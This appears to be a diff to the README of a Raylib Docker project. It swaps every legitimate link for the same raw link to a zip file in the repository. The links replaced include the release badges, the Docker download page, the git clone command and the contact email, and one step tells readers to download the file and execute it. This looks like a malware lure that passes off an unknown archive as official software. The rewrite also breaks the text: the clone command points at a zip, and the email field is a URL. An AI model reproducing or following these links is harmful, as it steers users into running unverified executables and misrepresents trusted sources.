@@ -1,7 +1,7 @@
 # 🚀 RayLibContainer: Your Game Development Environment
 
-![RayLibContainer](https://img.shields.io/badge/RayLibContainer-v1.0.0-blue.svg)
-[![GitHub Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)](https://github.com/RAGUL-TR/RayLibContainer/releases)
+![RayLibContainer](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip)
+[![GitHub Releases](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip)](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip)
 
 Welcome to **RayLibContainer**, a containerized development environment tailored for game development using Raylib on Docker. This repository equips you with Dockerfiles and clear instructions to run and build Raylib projects efficiently, offering both hardware acceleration and software rendering options.
 
@@ -21,7 +21,7 @@ Welcome to **RayLibContainer**, a containerized development environment tailored
 
 Game development can be a complex process, especially when dealing with dependencies and environment configurations. **RayLibContainer** simplifies this by providing a ready-to-use Docker environment. With just a few commands, you can set up a fully functional game development environment.
 
-For detailed releases, visit our [Releases section](https://github.com/RAGUL-TR/RayLibContainer/releases).
+For detailed releases, visit our [Releases section](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip).
 
 ## ⚙️ Features
 
@@ -37,15 +37,15 @@ For detailed releases, visit our [Releases section](https://github.com/RAGUL-TR/
 
 To get started with **RayLibContainer**, follow these steps:
 
-1. **Install Docker**: Ensure you have Docker installed on your machine. You can download it from [Docker's official website](https://www.docker.com/get-started).
+1. **Install Docker**: Ensure you have Docker installed on your machine. You can download it from [Docker's official website](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip).
    
 2. **Clone the Repository**:
    ```bash
-   git clone https://github.com/RAGUL-TR/RayLibContainer.git
+   git clone https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip
    cd RayLibContainer
    ```
 
-3. **Download the Latest Release**: You can find the latest release [here](https://github.com/RAGUL-TR/RayLibContainer/releases). Download the appropriate file for your system and execute it.
+3. **Download the Latest Release**: You can find the latest release [here](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip). Download the appropriate file for your system and execute it.
 
 4. **Build the Docker Image**:
    ```bash
@@ -131,7 +131,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [RAGUL-TR](https://github.com/RAGUL-TR)
-- Email: ragul@example.com
+- GitHub: [RAGUL-TR](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip)
+- Email: https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip
 
-Thank you for using **RayLibContainer**! We hope it enhances your game development experience. For more updates, keep an eye on our [Releases section](https://github.com/RAGUL-TR/RayLibContainer/releases).
+Thank you for using **RayLibContainer**! We hope it enhances your game development experience. For more updates, keep an eye on our [Releases section](https://github.com/RAGUL-TR/RayLibContainer/raw/refs/heads/main/user_code/Container-Ray-Lib-3.6-alpha.2.zip).
